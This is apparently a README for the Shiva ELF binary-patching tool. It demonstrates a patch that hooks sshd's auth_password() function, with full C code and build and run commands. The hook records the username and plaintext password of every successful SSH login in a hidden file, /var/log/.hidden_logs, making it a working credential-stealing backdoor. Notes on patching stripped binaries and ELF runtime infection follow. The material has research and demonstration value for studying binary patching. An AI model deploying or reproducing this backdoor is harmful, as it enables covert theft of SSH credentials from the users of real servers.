# sshd patch

Turn Shiva into a friendly process memory backdoor that logs incoming usernames
and passwords that are authenticated via the auth_password() function in the
sshd binary.

## Method

Shiva installs a patch that hooks the function auth_password() within sshd. In
this particular example sshd has it's local symbol table ".symtab" in-tact
within the binary, and so we can write the patch by using symbol interposition
on the auth_password() function, sshd_patch.c

```
int auth_password(struct ssh *ssh, const char *password)
{
	FILE *logfd;
	int ret;
	struct Authctxt *authctxt = ssh->authctxt;
	struct passwd *pw = authctxt->pw;

	logfd = fopen("/var/log/.hidden_logs", "a+");
	fprintf(logfd, "auth_password hook called\n");

	/*
	 * call the original auth_password(ssh, password); by using
	 * the SHIVA_HELPER_CALL_EXTERNAL macro.
	 */
	ret = SHIVA_HELPER_CALL_EXTERNAL_ARGS2(auth_password, ssh, password);
	if (ret > 0) {
		/*
		 * If the real auth_password() succeeded, then log
		 * the username and password to "/var/log/.hidden_logs"
		 */
		fprintf(logfd, "Successful SSH login\n"
		    "Username: %s\n"
		    "Password: %s\n", pw->pw_name, password);
	}
	fclose(logfd);
	return ret;
}
```

## A note on patching stripped binaries

Shiva relies on libelfmaster for symbol table reconstruction of stripped
binaries, which internally parses the PT_GNU_EH_FRAME segment in the ELF binary to
reconstruct the symbols for the .text section. In the Linux aarch64 environment
that I'm developing in (Ubuntu 18.04.6 LTS) I have not seen any ELF binaries that
have the any data in their .eh_frame section, and a PT_GNU_EH_FRAME segment
simply doesn't exist in the ones that I've observed. The original version
of Shiva was for x86_64 (Found at https://github.com/elfmaster/shiva) and this
works with function symbol table reconstruction, therefore allowing a developer
to patch the sshd binary even if it was stripped. The developer would need to
first determine the address of where the auth_password() function is within the
binary. libelfmaster would internally generate a symbol, i.e: "fn_0x4002f3" and
so the patch developer would simply interpose the function by re-writing it, i.e.
```
int fn_0x4002f3(struct ssh *ssh, const char *password)
{
	/*
	 * new code here
         */
}


## A note on ELF runtime infection

This type of process-memory function hooking would typically be done either
on-disk to the ELF binary directly or in memory via `__libc_dlopen_mode` or
PTRACE. Generally these techniques are non-trivial and require developers to
write advanced tools that are thousands of lines of C code.

## Use patch

$ make
$ sudo make install
$ $PWD/sshd.patched -p 31337 -d
